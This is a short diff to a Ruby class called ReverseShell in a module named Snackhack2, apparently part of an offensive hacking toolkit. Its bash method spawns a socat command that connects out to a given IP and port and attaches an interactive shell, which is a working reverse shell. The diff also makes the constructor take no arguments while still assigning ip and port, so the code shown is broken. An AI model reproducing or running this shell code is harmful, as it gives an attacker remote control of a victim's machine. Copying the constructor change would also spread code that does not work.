@@ -5,7 +5,7 @@ module Snackhack2
   class ReverseShell
     attr_accessor :ip, :port
 
-    def initialize(ip, port)
+    def initialize()
       @ip   = ip
       @port = port
     end
@@ -25,9 +25,7 @@ module Snackhack2
     end
 
     def bash
-      c = %(
-    		bash.exe -c "socat tcp-connect:#{@ip}:#{@port} exec:sh,pty,stderr,setsid,sigint,sane"
-    	)
+      c = %(bash.exe -c "socat tcp-connect:#{@ip}:#{@port} exec:sh,pty,stderr,setsid,sigint,sane")
       Process.spawn(c)
     end
   end
